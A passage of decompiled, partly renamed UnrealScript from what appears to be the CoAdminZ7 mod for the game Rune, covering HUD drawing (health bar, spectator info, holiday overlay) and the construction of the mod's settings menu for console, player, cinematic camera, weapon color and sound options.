    TargetCanvas.StrLen(TextToDraw, TextWidth, TextHeight);
    TargetCanvas.SetPos((FrameX / 2.0) - (TextWidth / 2.0), (FrameY / 2.0) - (TextHeight / 2.0));
    TargetCanvas.Setcolor(255.0, 0.0, 0.0); // Set color to red
    TargetCanvas.DrawText(TextToDraw, false);
    TargetCanvas.Setcolor(255.0, 255.0, 255.0); // Reset color to white
}


// Suggested name: DrawOverlayMessage
function DrawOverlayMessage(Canvas Canvas)
{
    // This function draws an overlay message on the canvas, potentially for special events.

    local int Pumpkin1X, Pumpkin1Y, Pumpkin2X, Pumpkin2Y;

    if (B_v6701)
    {
        Pumpkin1X = int(Canvas.ClipX / 2.0) - 200;
        Pumpkin2X = int(Canvas.ClipX / 2.0) + 200;
        Pumpkin1Y = int(Canvas.ClipY / 2.0);
        Pumpkin2Y = int(Canvas.ClipY / 2.0);
        B_v6701 = false;
    }

    if (STR_v6703 == "Happy Halloween!")
    {
        DrawStretchedBox(Canvas, 0.97, 0, 0, int(Canvas.ClipX), int(Canvas.ClipY), MakeColor(byte(BR), byte(BG), byte(BB)));
        Canvas.Style = 3;
        Canvas.bCenter = false;
        Canvas.bNoSmooth = true;
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.SetPos(float(Pumpkin1X), float(Pumpkin1Y));
        Canvas.DrawIcon(Texture'coadminz7.eq_vxv_5308.pumpkin', 2.0);
        Canvas.SetPos(float(Pumpkin2X), float(Pumpkin2Y));
        Canvas.DrawIcon(Texture'coadminz7.eq_vxv_5308.pumpkin', 2.0);
        Pumpkin1X += int(RandRange(-5.0, 5.0));
        Pumpkin1Y += int(RandRange(-4.0, 4.0));
        Pumpkin2X += int(RandRange(-4.0, 4.0));
        Pumpkin2Y += int(RandRange(-5.0, 5.0));
    }
    else
    {
        if (B_v6544)
        {
            DrawStretchedBox(Canvas, 1.0, 0, 0, int(Canvas.ClipX), int(Canvas.ClipY), MakeColor(byte(BR), byte(BG), byte(BB)));
        }
        else
        {
            DrawStretchedBox(Canvas, 0.97, 0, 0, int(Canvas.ClipX), int(Canvas.ClipY), MakeColor(byte(BR), byte(BG), byte(BB)));
        }
    }

    DrawCenteredText(Canvas, STR_v6703);
}

// Suggested name: DrawSpectatorInfo
function DrawSpectatorInfo(Canvas Canvas)
{
    // This function draws information about the currently viewed player (in spectator mode).
    // It displays health, kills, deaths, and various trophies.

    local int InfoBoxX, InfoBoxY, TrophyOffset;
    local PlayerReplicationInfo ViewedPlayerPRI;
    local Pawn ViewedPawn;
    local Texture SpreeTrophy, HeadsTrophy, ThrowsTrophy;

    SpreeTrophy = Texture'RuneI.TrophySpree';
    HeadsTrophy = Texture'RuneI.TrophyHeads';
    ThrowsTrophy = Texture'coadminz7.Icons.TrophyThrows';

    InfoBoxX = int(Canvas.ClipX - 250.0);
    InfoBoxY = int(Canvas.ClipY - 150.0);

    DrawStretchedBox(Canvas, categoryAlpha, InfoBoxX, InfoBoxY, 250, 80, MakeColor(byte(BR), byte(BG), byte(BB)));

    ViewedPawn = Pawn(Owner.ViewTarget);
    ViewedPlayerPRI = ViewedPawn.PlayerReplicationInfo;

    Canvas.Font = Canvas.BigFont;
    Canvas.SetPos(float(InfoBoxX + 8), float(InfoBoxY + 7));
    Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    Canvas.DrawText("Viewing:  " $ ViewedPawn.PlayerReplicationInfo.PlayerName);

    InfoBoxY += 2;

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 25));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText(("Health: " $ string(ViewedPawn.Health)) $ "%");

    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 40));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText("Kills: " $ string(int(ViewedPawn.PlayerReplicationInfo.Score)));

    Canvas.SetPos(float(InfoBoxX + 10), float(InfoBoxY + 55));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText("Deaths: " $ string(int(ViewedPawn.PlayerReplicationInfo.Deaths)));

    Canvas.SetPos(float(InfoBoxX + 90), float(InfoBoxY + 40));
    Canvas.DrawTile(SpreeTrophy, 16.0, 16.0, 0.0, 0.0, float(SpreeTrophy.USize), float(SpreeTrophy.VSize));
    Canvas.DrawText(string(ViewedPlayerPRI.MaxSpree), false);

    TrophyOffset += 20;

    Canvas.SetPos(float(InfoBoxX + 130), float(InfoBoxY + 40));
    Canvas.DrawTile(HeadsTrophy, 16.0, 16.0, 0.0, 0.0, float(HeadsTrophy.USize), float(HeadsTrophy.VSize));
    Canvas.DrawText(string(ViewedPlayerPRI.HeadKills), false);

    if (zPlayerReplicationInfo(ViewedPlayerPRI) != none)
    {
        Canvas.SetPos(float(InfoBoxX + 170), float(InfoBoxY + 40));
        Canvas.DrawTile(ThrowsTrophy, 16.0, 16.0, 0.0, 0.0, float(ThrowsTrophy.USize), float(ThrowsTrophy.VSize));
        Canvas.DrawText(string(zPlayerReplicationInfo(ViewedPlayerPRI).INT_v5354), false);

        Canvas.SetPos(float(InfoBoxX + 210), float(InfoBoxY + 40));
        Canvas.DrawColor = MakeColor(255, 105, 180);
        Canvas.DrawTile(Texture'RuneFX2.Wordballoon', 16.0, 16.0, 0.0, 0.0, float(ThrowsTrophy.USize - 2), float(ThrowsTrophy.VSize - 2));
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.DrawText(string(zPlayerReplicationInfo(ViewedPlayerPRI).INT_v5355), false);
    }
}

// Suggested name: GetHealthColor
function Color GetHealthColor(float HealthPercentage)
{
    // This function returns a color based on a health percentage, transitioning from red to yellow to green.

    local Color HealthColor;

    HealthColor.A = 0;

    if (HealthPercentage > 0.66)
    {
        HealthColor.R = 0;
        HealthColor.G = byte(255.0 * HealthPercentage);
        HealthColor.B = 0;
    }
    else if (HealthPercentage > 0.33)
    {
        HealthColor.R = byte(225.0 - (255.0 * HealthPercentage));
        HealthColor.G = byte(1.0 + (255.0 * HealthPercentage));
        HealthColor.B = 0;
    }
    else
    {
        HealthColor.R = byte(255.0 - (255.0 * HealthPercentage));
        HealthColor.G = 0;
        HealthColor.B = 0;
    }

    return HealthColor;
}

// Suggested name: DrawHealthBar
function DrawHealthBar(Canvas Canvas)
{
    // This function draws a health bar on the canvas, representing the player's current health.

    local int HealthBarX, HealthBarY, CurrentHealth;
    local float HealthPercentage;

    HealthBarX = 0;
    HealthBarY = int(Canvas.ClipY - 100.0);

    if (Viewport.Actor.Health > 0)
    {
        CurrentHealth = Viewport.Actor.Health;
    }
    else
    {
        CurrentHealth = 0;
    }

    HealthPercentage = (1.0 * float(CurrentHealth)) / 100.0;

    // Draw background for max health
    DrawStretchedBox(Canvas, categoryAlpha, HealthBarX, HealthBarY - 2, int(float(Viewport.Actor.MaxHealth) * 1.5), 24, MakeColor(byte(BR), byte(BG), byte(BB)));
    // Draw current health bar
    DrawStretchedBox(Canvas, categoryAlpha, HealthBarX, HealthBarY, int(float(CurrentHealth) * 1.5), 20, GetHealthColor(HealthPercentage));

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(HealthBarX) + ((float(CurrentHealth) * 1.4) / 2.0), float(HealthBarY + 4));
    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText(string(CurrentHealth));
}

// Suggested name: IsMouseOverNonRootWindow
final function bool IsMouseOverNonRootWindow()
{
    // This function checks if the mouse cursor is currently over a window that is not the RuneRootWindow,
    // specifically when the menu is active (INT_v6715 == 1).

    if (zRuneMenu(UNK_v6297) != none)
    {
        if ((INT_v6715 == 1) && (Root.MouseWindow != none))
        {
            if (Left(Root.GetPlayerOwner().GetItemName(string(Root.MouseWindow)), 14) != "RuneRootWindow")
            {
                return false;
            }
        }
        return true;
    }
    return false; // Default return if zRuneMenu is none
}
// Suggested name: DrawMenu
// This function handles drawing the CoAdminZ menu on the canvas, including categories, background, and conditional elements like Discord ads.
// It adjusts rendering settings, positions, and visibility based on various flags and screen size.
final function DrawMenu(Canvas Canvas)
{
	local bool bIsSmallScreen; // Flag to check if the screen width is small (less than 900 pixels)
	local bool bShowDiscordAd; // Flag to determine if the Discord ad should be shown
	local bool bIsMouseOverMenu; // Flag to check if the mouse is over the menu

	// Adjust rendering map based on menu state and black background setting
	if (INT_v6715 == 1)
	{
		if (showBlackBackground)
		{
			Root.GetPlayerOwner().RendMap = 0;
		}
		else
		{
			Root.GetPlayerOwner().RendMap = 5;
		}
	}

	// Set menu visibility and positioning based on conditions
	if ((INT_v6715 == 1) && !bQuickKeyEnable)
	{
		// Adjust rendering again for this state
		if (showBlackBackground)
		{
			Root.GetPlayerOwner().RendMap = 0;
		}
		else
		{
			Root.GetPlayerOwner().RendMap = 5;
		}
		B_v6446 = true;
		INT_v6451 = int(10.0 + (GameMenu.WinWidth * Root.GUIScale)); // Calculate horizontal position
		INT_v6450 = 250;
		INT_v3204 = 250;
	}
	else
	{
		if ((INT_v6715 == 1) && bShowConsole)
		{
			B_v6446 = true;
			INT_v6451 = 10 + horizontalModifier;
			INT_v6450 = 150 + detailsModifier;
			INT_v3204 = 150 + detailsModifier;
		}
		else
		{
			B_v6446 = false;
			INT_v6451 = 10 + horizontalModifier;
			INT_v6450 = 150 + detailsModifier;
			INT_v3204 = 150 + detailsModifier;
		}
	}

	INT_v3203 = INT_v6451 + menuDist;
	Canvas.Font = Canvas.MedFont;

	// Draw menu elements if visible
	if (B_v6445 || B_v6446)
	{
		// Check if mouse is over non-root window
		if (IsMouseOverNonRootWindow())
		{
			bIsMouseOverMenu = true;
		}
		else
		{
			bIsMouseOverMenu = false;
		}

		// Draw main menu background and highlight
		DrawStretchedBox(Canvas, categoryAlpha, INT_v6451 - 20, (INT_v6450 - 23) - catY, categoryWidth, categoryHeight, MakeColor(byte(BR), byte(BG), byte(BB)));
		DrawHorizontalFilledRect(Canvas, float(INT_v6451 - 20), ((float(INT_v6450) - 0.5) - float(catY)) + float((gI - 1) * (12 + categoryGap)), float(categoryWidth), 17.0, MakeColor(byte(HR), byte(hG), byte(hB)), 0.15);

		// Draw category menus (could be looped if strings were in an array, but kept as is for simplicity)
		if (B_v6446)
		{
			DrawCategoryMenu("~ CoAdminZ7", 0, Canvas);
		}
		else
		{
			DrawCategoryMenu(("~ Minimize [" $ cMenuKeyName) $ "]", 0, Canvas);
		}
		DrawCategoryMenu("~ Console", 1, Canvas);
		if (!spec)
		{
			DrawCategoryMenu("~ Player", 2, Canvas);
		}
		else
		{
			DrawCategoryMenu("~ Spectator", 2, Canvas);
		}
		DrawCategoryMenu("~ HUD", 3, Canvas);
		DrawCategoryMenu("~ Chat", 4, Canvas);
		DrawCategoryMenu("~ Killfeed", 5, Canvas);
		DrawCategoryMenu("~ Map settings", 6, Canvas);
		DrawCategoryMenu("~ Demo recording", 7, Canvas);
		DrawCategoryMenu("~ CoAdmin", 8, Canvas);
		DrawCategoryMenu("~ Server", 9, Canvas);
		DrawCategoryMenu("~ Summon", 10, Canvas);
		if (devSettings == 1)
		{
			DrawCategoryMenu("~ Menu settings", 11, Canvas);
		}
		else
		{
			if (devSettings == 2)
			{
				DrawCategoryMenu("~ Test", 11, Canvas);
			}
			else
			{
				DrawCategoryMenu("~ Donate $$$", 11, Canvas);
			}
		}
	}
	else
	{
		bIsMouseOverMenu = false;
		// Draw minimized menu indicator if scores are shown
		if (Viewport.Actor.bShowScores && !B_v6413)
		{
			DrawStretchedBox(Canvas, categoryAlpha, int(Canvas.ClipX - 200.0), int(Canvas.ClipY - 16.0), 120, categoryHeightMin, MakeColor(byte(BR), byte(BG), byte(BB)));
			DrawCategoryMenu(("~ " $ cMenuKeyName) $ " to open ~", 0, Canvas, true);

			// Determine screen size for ad positioning
			if (Canvas.ClipX > 900.0)
			{
				bIsSmallScreen = false;
			}
			else
			{
				bIsSmallScreen = true;
			}

			// Draw Discord ad if enabled
			if (showDiscordAd)
			{
				Canvas.DrawColor.R = 255;
				Canvas.DrawColor.G = 255;
				Canvas.DrawColor.B = 255;
				Canvas.Style = 5;
				Canvas.AlphaScale = 0.45;
				Canvas.bNoSmooth = true;

				if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5402)
				{
					Canvas.AlphaScale = 0.9;
					if (!bIsSmallScreen)
					{
						Canvas.SetPos(Canvas.ClipX * (FLT_v6535 + 0.09), FLT_v6534 * 1.06);
						Canvas.DrawIcon(Texture'coadminz7.eqA_vxv_6264.legacy', FLT_v6537 + 1.0);
					}
					else
					{
						Canvas.SetPos(Canvas.ClipX * (FLT_v6535 + 0.07), FLT_v6534 * 1.06);
						Canvas.DrawIcon(Texture'coadminz7.eqA_vxv_6264.legacy', FLT_v6537 + 0.97);
					}
				}
				else
				{
					if (!bIsSmallScreen)
					{
						Canvas.SetPos(Canvas.ClipX * (FLT_v6535 + 0.07), FLT_v6534 * 1.06);
						Canvas.DrawIcon(Texture'coadminz7.eqA_vxv_6264.discord', FLT_v6537 + 1.0);
					}
					else
					{
						Canvas.SetPos(Canvas.ClipX * (FLT_v6535 + 0.05), FLT_v6534 * 1.06);
						Canvas.DrawIcon(Texture'coadminz7.eqA_vxv_6264.discord', FLT_v6537 + 0.97);
					}
				}
				Canvas.Style = 1;
			}
		}
	}

	// Handle mouse interaction and menu setup if menu is active
	if (!B_v6445 && !B_v6446)
	{
		return;
	}
	eqpct_vxv_1151(Canvas, int(MouseX), int(MouseY));
	eqK_vxv_2379();
	return;
}

final function eqK_vxv_2379()
{
    local int i, X, Local_int_v0;

    INT_v6430 = 12;
    INT_v6431 = 9;
    INT_v6432 = 6;
    INT_v6433 = 5;
    X = gI;
    if(gI == 1)
    {
        i = 0;
        MenuCategories[X].stcProperty[i] = "Console timestamps";
        MenuCategories[X].Help[i] = "Toggles timestamps at console messages";
        MenuCategories[X].propertyName[i] = "bTimeStamps";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Console talk";
        MenuCategories[X].Help[i] = "If activated it'll always have 'say ' typed in by default.";
        MenuCategories[X].propertyName[i] = "bConsoleChat";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Auto-scroll";
        MenuCategories[X].Help[i] = "Toggles the automatic scrolling. (when a new message enters)";
        MenuCategories[X].propertyName[i] = "bAutoScroll";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Console transparency";
        MenuCategories[X].Help[i] = ("Alters the transparency of the console window [" $ string(consoleTransparency)) $ "]";
        MenuCategories[X].propertyName[i] = "float";
        MenuCategories[X].controlStyle[i] = 2;
        MenuCategories[X].Value[i] = "consoletransparency";
        MenuCategories[X].maxValue[i] = 100;
        MenuCategories[X].minValue[i] = 0;
        MenuCategories[X].stepValue[i] = 5.0000000;
        i = i + 1;
        MenuCategories[X].stcProperty[i] = "Overwrite console font";
        MenuCategories[X].Help[i] = "Enable this to change console font";
        MenuCategories[X].propertyName[i] = "bOverwriteFont";
        MenuCategories[X].Value[i] = "/";
        i = i + 1;
        if(bOverwriteFont)
        {
            MenuCategories[X].stcProperty[i] = "| Console font";
            MenuCategories[X].Help[i] = "Change consolefont";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].Value[i] = "consolefont";
            MenuCategories[X].maxValue[i] = 5;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
        }
        MenuCategories[X].stcProperty[i] = "Green text color";
        MenuCategories[X].Help[i] = "Changes the chatcolor to green in the console window, cuz its c00l";
        MenuCategories[X].propertyName[i] = "bUseGreenColor";
        MenuCategories[X].Value[i] = "/";
        MenuCategories[X].count = i;
    }
    if(gI == 2)
    {
        i = 0;
        if(spec)
        {
            MenuCategories[X].stcProperty[i] = "Ghost mode";
            MenuCategories[X].Help[i] = "Fly through walls if enabled.";
            MenuCategories[X].propertyName[i] = "bNoCollision";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Show player info";
            MenuCategories[X].Help[i] = "Toggles the window that displays information about the player you're viewing.";
            MenuCategories[X].propertyName[i] = "bShowInfos";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Show names";
            MenuCategories[X].Help[i] = "Toggles playernames above head";
            MenuCategories[X].propertyName[i] = "bShowNames";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Cinematic mode";
            MenuCategories[X].Help[i] = "Toggles cinematic mode";
            MenuCategories[X].propertyName[i] = "bCinematic";
            MenuCategories[X].Value[i] = "/";
            if(bCinematic)
            {
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Camera Speed";
                MenuCategories[X].Help[i] = "";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "cineSpeed";
                MenuCategories[X].maxValue[i] = 1000;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Camera Distance";
                MenuCategories[X].Help[i] = "";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "cineDist";
                MenuCategories[X].maxValue[i] = 2000;
                MenuCategories[X].minValue[i] = -2000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Camera Acceleration";
                MenuCategories[X].Help[i] = "";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "cineAccel";
                MenuCategories[X].maxValue[i] = 100;
                MenuCategories[X].minValue[i] = -100;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Camera Height";
                MenuCategories[X].Help[i] = "";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "cineHeight";
                MenuCategories[X].maxValue[i] = 1000;
                MenuCategories[X].minValue[i] = -1000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Camera Roll";
                MenuCategories[X].Help[i] = "";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "cineRoll";
                MenuCategories[X].maxValue[i] = 10000;
                MenuCategories[X].minValue[i] = -10000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Camera Stiffness";
                MenuCategories[X].Help[i] = "";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Value[i] = "cineSmoothing";
                MenuCategories[X].maxValue[i] = 25;
                MenuCategories[X].minValue[i] = int(0.1000000);
                MenuCategories[X].stepValue[i] = 0.1000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Wall blocking";
                MenuCategories[X].Help[i] = "Don't let the camera get inside BSP.";
                MenuCategories[X].propertyName[i] = "bWallBlock";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Joints";
                MenuCategories[X].Help[i] = "Use specific joints for camera rot/pos";
                MenuCategories[X].propertyName[i] = "bJoints";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                if(bJoints)
                {
                    MenuCategories[X].stcProperty[i] = "  | Sel. joint";
                    if(Owner.ViewTarget != none)
                    {
                        MenuCategories[X].Help[i] = ("Select the joint you want to use(" $ Owner.ViewTarget.GetJointName(bJointNum)) $ ")";                        
                    }
                    else
                    {
                        MenuCategories[X].Help[i] = "Select the joint you want to use.";
                    }
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "bJointNum";
                    MenuCategories[X].maxValue[i] = 50;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 1.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "  | Use Jointpos";
                    MenuCategories[X].Help[i] = "Toggle";
                    MenuCategories[X].propertyName[i] = "bJointPos";
                    MenuCategories[X].Value[i] = "/";
                    i = i + 1;
                    if(bJointPos)
                    {
                        MenuCategories[X].stcProperty[i] = "    | Offset X";
                        MenuCategories[X].Help[i] = "modify pos offset";
                        MenuCategories[X].propertyName[i] = "int";
                        MenuCategories[X].Value[i] = "jointpos_x";
                        MenuCategories[X].controlStyle[i] = 0;
                        MenuCategories[X].maxValue[i] = 65536;
                        MenuCategories[X].minValue[i] = -65536;
                        MenuCategories[X].stepValue[i] = 1.0000000;
                        i = i + 1;
                        MenuCategories[X].stcProperty[i] = "    | Offset Y";
                        MenuCategories[X].Help[i] = "modify pos offset";
                        MenuCategories[X].propertyName[i] = "int";
                        MenuCategories[X].Value[i] = "jointpos_y";
                        MenuCategories[X].controlStyle[i] = 0;
                        MenuCategories[X].maxValue[i] = 65536;
                        MenuCategories[X].minValue[i] = -65536;
                        MenuCategories[X].stepValue[i] = 1.0000000;
                        i = i + 1;
                        MenuCategories[X].stcProperty[i] = "    | Offset Z";
                        MenuCategories[X].Help[i] = "modify pos offset";
                        MenuCategories[X].propertyName[i] = "int";
                        MenuCategories[X].Value[i] = "jointpos_z";
                        MenuCategories[X].controlStyle[i] = 0;
                        MenuCategories[X].maxValue[i] = 65536;
                        MenuCategories[X].minValue[i] = -65536;
                        MenuCategories[X].stepValue[i] = 1.0000000;
                        i = i + 1;
                    }
                    MenuCategories[X].stcProperty[i] = "  | Use Jointrotation";
                    MenuCategories[X].Help[i] = "Toggle";
                    MenuCategories[X].propertyName[i] = "bJointRot";
                    MenuCategories[X].Value[i] = "/";
                    i = i + 1;
                    if(bJointRot)
                    {
                        MenuCategories[X].stcProperty[i] = "    | Pitch Correction";
                        MenuCategories[X].Help[i] = "modify rot offset";
                        MenuCategories[X].propertyName[i] = "int";
                        MenuCategories[X].Value[i] = "jointrot_pitch";
                        MenuCategories[X].controlStyle[i] = 0;
                        MenuCategories[X].maxValue[i] = 65536;
                        MenuCategories[X].minValue[i] = -65536;
                        MenuCategories[X].stepValue[i] = 1.0000000;
                        i = i + 1;
                        MenuCategories[X].stcProperty[i] = "    | Yaw Correction";
                        MenuCategories[X].Help[i] = "modify rot offset";
                        MenuCategories[X].propertyName[i] = "int";
                        MenuCategories[X].Value[i] = "jointrot_yaw";
                        MenuCategories[X].controlStyle[i] = 0;
                        MenuCategories[X].maxValue[i] = 65536;
                        MenuCategories[X].minValue[i] = -65536;
                        MenuCategories[X].stepValue[i] = 1.0000000;
                        i = i + 1;
                        MenuCategories[X].stcProperty[i] = "    | Roll Correction";
                        MenuCategories[X].Help[i] = "modify rot offset";
                        MenuCategories[X].propertyName[i] = "int";
                        MenuCategories[X].Value[i] = "jointrot_roll";
                        MenuCategories[X].controlStyle[i] = 0;
                        MenuCategories[X].maxValue[i] = 65536;
                        MenuCategories[X].minValue[i] = -65536;
                        MenuCategories[X].stepValue[i] = 1.0000000;
                        i = i + 1;
                    }
                }
                MenuCategories[X].stcProperty[i] = "| VT Rotation YAW";
                MenuCategories[X].Help[i] = "Toggle freecam / locked cam on viewtarget. (left/right)";
                MenuCategories[X].propertyName[i] = "bViewTargetRotationYaw";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| VT PITCH";
                MenuCategories[X].Help[i] = "Toggle freecam / locked cam on viewtarget. (up/down)";
                MenuCategories[X].propertyName[i] = "bViewTargetRotationPitch";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Manual settings ";
                MenuCategories[X].Help[i] = "Shows instructions for the 'cine' command - so you can bind settings instead of using this menu";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "*cine HELP";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "| Reset settings";
                MenuCategories[X].Help[i] = "Change camera settings back to default";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "*cine RESET";
                MenuCategories[X].count = i;                
            }
            else
            {
                MenuCategories[X].count = i;
            }            
        }
        else
        {
            MenuCategories[X].stcProperty[i] = "Change status";
            if(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5375 != "")
            {
                MenuCategories[X].Help[i] = ("Current status: '" $ zPlayerReplicationInfo(Owner.PlayerReplicationInfo).STR_v5375) $ "'";                
            }
            else
            {
                MenuCategories[X].Help[i] = "Used to change your status in killed-by-window. Example: status Good fight!";
            }
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "-status ";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Custom Taunt";
            MenuCategories[X].Help[i] = "Configures the taunt you use, default or a custom one.";
            MenuCategories[X].propertyName[i] = "int";
            MenuCategories[X].controlStyle[i] = 1;
            MenuCategories[X].Value[i] = "tauntID";
            MenuCategories[X].maxValue[i] = 11;
            MenuCategories[X].minValue[i] = 0;
            MenuCategories[X].stepValue[i] = 1.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Custom blood density";
            MenuCategories[X].Help[i] = ("Alters the bloodmist density [ " $ string(bloodDensity)) $ " ]";
            MenuCategories[X].propertyName[i] = "float";
            MenuCategories[X].controlStyle[i] = 2;
            MenuCategories[X].Value[i] = "bloodDensity";
            MenuCategories[X].defaultFloat[i] = 80.0000000;
            MenuCategories[X].maxValue[i] = 255;
            MenuCategories[X].minValue[i] = 30;
            MenuCategories[X].stepValue[i] = 5.0000000;
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Custom weaponcolor";
            MenuCategories[X].Help[i] = "Used to change your own weapon color ( clientside )";
            MenuCategories[X].propertyName[i] = "bCustomWeaponColor";
            MenuCategories[X].Value[i] = "/";
            if(bCustomWeaponColor)
            {
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "|   Weapon color R";
                MenuCategories[X].Help[i] = ("modify red amount [" $ string(weaR)) $ "]";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "wear";
                MenuCategories[X].controlStyle[i] = 3;
                MenuCategories[X].maxValue[i] = 255;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "|   Weapon color G";
                MenuCategories[X].Help[i] = ("modify green amount [" $ string(weaG)) $ "]";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "weag";
                MenuCategories[X].controlStyle[i] = 4;
                MenuCategories[X].maxValue[i] = 255;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "|   Weapon color B";
                MenuCategories[X].Help[i] = ("modify blue amount [" $ string(weaB)) $ "]";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "weab";
                MenuCategories[X].controlStyle[i] = 5;
                MenuCategories[X].maxValue[i] = 255;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;                
            }
            else
            {
                i = i + 1;
            }
            MenuCategories[X].stcProperty[i] = "Change menukey";
            MenuCategories[X].Help[i] = "Used to change the key to open/close this menu (default: F11)";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "-menuKey ";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Announce trophies";
            MenuCategories[X].Help[i] = "Toggles announcing 1000/2000/3000/4000 kills etc";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].propertyName[i] = "announceKills";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Unofficial RUNE forum";
            MenuCategories[X].Help[i] = "Opens the unofficial Rune forum in your browser";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "forum";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Joystick/Controller";
            MenuCategories[X].Help[i] = "Allows Joystick - blocks mouse 100% - rejoin to apply";
            MenuCategories[X].controlStyle[i] = 0;
            MenuCategories[X].propertyName[i] = "bSwapInput";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Soundname";
            MenuCategories[X].Help[i] = "Enter a specific sound, e.g: CAZResources.hohoho";
            MenuCategories[X].controlStyle[i] = 1;
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "-setsound ";
            if(UNK_v6410 != none)
            {
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "No overwrite";
                MenuCategories[X].Help[i] = "no other sound can overwrite yours";
                MenuCategories[X].propertyName[i] = "soundNoOverWrite";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Sound Volume";
                MenuCategories[X].Help[i] = "Alters volume";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Value[i] = "soundVolume";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Sound Pitch";
                MenuCategories[X].Help[i] = "Alters pitch";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "soundPitch";
                MenuCategories[X].maxValue[i] = 10;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 0.2000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Sound Radius";
